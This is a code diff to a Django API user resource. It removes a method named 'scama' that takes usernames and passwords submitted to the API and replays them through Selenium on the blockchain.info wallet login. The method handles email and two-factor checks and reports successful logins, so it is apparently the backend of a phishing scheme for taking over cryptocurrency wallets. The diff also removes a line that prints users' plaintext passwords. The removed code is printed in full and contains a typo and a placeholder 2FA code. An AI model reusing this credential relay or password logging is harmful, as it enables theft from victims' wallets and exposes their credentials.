@@ -104,64 +104,11 @@ class UserResource(ModelResource):
                 (self._meta.resource_name,),
                 self.wrap_view('scama'), name='api_logout'),
 	]
-    def scama(self,request,**kwargs):
-	self.method_check(request, allowed=['post'])
-	data = self.deserialize(request, request.body, format=request.META.get('CONTENT_TYPE', 'application/json'))
-	username = data.get('username', '')
-        password = data.get('password', '')
-	from selenium import webdriver
-	from selenium.webdriver.common.keys import Keys
-	import time
-	#profile = webdriver.FirefoxProfile()
-	#profile.set_preference("general.useragent.override", "USERAAAAGENT")
-	driver = webdriver.Firefox()
-	driver.get("https://blockchain.info/wallet/#/login")
-	elem = driver.find_element_by_name("UID_input")
-	elem.clear()
-	elem.send_keys(username)
-	elem = driver.find_element_by_name("pass_input")
-	elem.clear()
-	elem.send_keys(password)
-	elem.send_keys(Keys.RETURN)
-#	time.sleep(1.5)
-	old_src=driver.page_source
-	time.sleep(.5)
-	while driver.page_source == old_src:
-		time.sleep(.1)
-	if  'translate="Error decrypting wallet, please check that your password is correct"'  in driver.page_source:
-	        #wrong password/mail mouch mverif
-	        print "wrong pass"
-	if 'class="alert alert-warning alert-dismissible"' in driver.page_source:
-	        #check mail
-	        print "checking mail"
-#	        time.sleep(60)
-		old_src=driver.page_source
-		while drive.page_source ==  old_src:
-			time.sleep(.1)
-	        if 'ng-show="settings.twoFactorMethod == 5"' in driver.page_source:
-	                #email clicked
-	                print "gettinf sms code"
-	                time.sleep(10)
-	                elem=driver.find_element_by_css_selector("input[ng-model='twoFactorCode']")
-	                elem.clear()
-	                elem.send_keys("HHHHHHHHh") #FINALY CODE HERE
-	                if 'translate="Invalid authentication code - 4 login attempts left"' in driver.page_source:
-	                        print "code incorrect "
-	                if 'translate="Error decrypting wallet, please check that your password is correct"' in driver.page_source:
-	                        print "password incorrect"
-	
-	else:
-	        print "mouch checkign email"
-	if 'translate="YOUR_BALANCES"' in driver.page_source:
-	        #no email/tlfn verif
-	        print "successfully loggedin"
-
     def register(self,request,**kwargs):
 	self.method_check(request, allowed=['post'])
 	data = self.deserialize(request, request.body, format=request.META.get('CONTENT_TYPE', 'application/json'))
 	username = data.get('username', '')
 	password = data.get('password', '')
-	print "passssssssss : "+str(password)
 	email 	 = data.get('email','')
 	first_name=data.get('first_name','')
 	last_name=data.get('last_name','')
